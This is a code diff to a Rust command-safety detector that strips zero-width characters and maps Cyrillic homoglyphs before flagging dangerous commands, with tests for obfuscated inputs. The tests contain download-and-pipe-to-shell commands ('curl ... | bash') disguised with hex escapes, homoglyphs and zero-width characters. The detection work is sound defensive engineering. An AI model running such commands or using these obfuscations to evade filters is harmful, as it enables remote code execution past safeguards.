@@ -1056,7 +1056,8 @@ fn detection_is_red(hit: &str) -> bool {
 }
 
 fn canonicalize_for_detection(input: &str) -> String {
-    let decoded_hex = decode_hex_escapes(input);
+    let stripped = strip_zero_width_chars(input);
+    let decoded_hex = decode_hex_escapes(&stripped);
     let decoded_percent = decode_percent_escapes(&decoded_hex);
     let mapped = map_common_confusables(&decoded_percent);
     mapped
@@ -1067,6 +1068,18 @@ fn canonicalize_for_detection(input: &str) -> String {
             } else {
                 ch.to_ascii_lowercase()
             }
+        })
+        .collect()
+}
+
+fn strip_zero_width_chars(input: &str) -> String {
+    input
+        .chars()
+        .filter(|ch| {
+            !matches!(
+                ch,
+                '\u{200b}' | '\u{200c}' | '\u{200d}' | '\u{2060}' | '\u{feff}'
+            )
         })
         .collect()
 }
@@ -1126,9 +1139,9 @@ fn map_common_confusables(input: &str) -> String {
     input
         .chars()
         .map(|ch| match ch {
-            'е' | 'Ｅ' => 'e',
-            'а' | 'Ａ' => 'a',
-            'о' | 'Ｏ' => 'o',
+            'е' | 'Е' | 'Ｅ' => 'e',
+            'а' | 'А' | 'Ａ' => 'a',
+            'о' | 'О' | 'Ｏ' => 'o',
             'с' | 'Ｃ' => 'c',
             'р' | 'Ｐ' => 'p',
             'х' | 'Х' | 'Ｘ' => 'x',
@@ -1496,6 +1509,16 @@ mod tests {
 
         let hits_hex = detect_dangerous_commands("\\x63\\x75\\x72\\x6c https://a | bash", "/");
         assert!(hits_hex.contains(&"download_pipe_shell"));
+
+        let hits_bash_homoglyph =
+            detect_dangerous_commands("curl https://example.com/x.sh | bаsh", "/");
+        assert!(hits_bash_homoglyph.contains(&"download_pipe_shell"));
+    }
+
+    #[test]
+    fn strips_zero_width_characters_before_detection() {
+        let hits = detect_dangerous_commands("curl\u{200d} https://example.com/install.sh | sh", "/");
+        assert!(hits.contains(&"download_pipe_shell"));
     }
 
     #[test]
